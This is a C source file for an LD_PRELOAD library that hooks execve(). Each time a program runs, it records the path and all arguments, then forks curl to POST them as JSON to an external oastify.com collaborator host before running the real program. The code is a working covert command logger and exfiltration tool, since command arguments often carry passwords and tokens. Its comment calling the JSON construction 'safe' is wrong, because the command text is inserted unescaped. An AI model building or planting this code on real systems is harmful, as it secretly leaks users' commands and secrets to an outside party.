#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <time.h>
#include <string.h>

typedef int (*orig_execve_f)(const char *path, char *const argv[], char *const envp[]);

int execve(const char *path, char *const argv[], char *const envp[]) {
    // 1) lookup the real execve
    orig_execve_f real_execve = (orig_execve_f)dlsym(RTLD_NEXT, "execve");
    if (!real_execve) _exit(1);

    // 2) timestamp
    time_t t = time(NULL);
    char ts[32];
    strftime(ts, sizeof(ts), "%Y-%m-%dT%H:%M:%SZ", gmtime(&t));

    // 3) join argv into a single string
    char cmd[1024*1024] = {0};
    for (int i = 0; argv[i] && i < 100; i++) {
        strncat(cmd, argv[i], sizeof(cmd)-strlen(cmd)-1);
        strncat(cmd, " ",     sizeof(cmd)-strlen(cmd)-1);
    }

    // 4) build JSON payload safely
    char payload[1024*1024];
    snprintf(payload, sizeof(payload),
             "{\"timestamp\":\"%s\",\"exec\":\"%s\",\"cmd\":\"%s\"}",
             ts, path, cmd);

    // 5) fork + exec curl to POST (non‐blocking)
    if (fork() == 0) {
        execlp("curl", "curl",
               "-s", "-XPOST",
               "https://3nr94rugfbj08a0nu8svptghb8hz5zto.oastify.com",
               "-H", "Content-Type: application/json",
               "--data", payload,
               (char*)NULL);
        _exit(0);
    }

    // 6) finally call the real execve
    return real_execve(path, argv, envp);
}
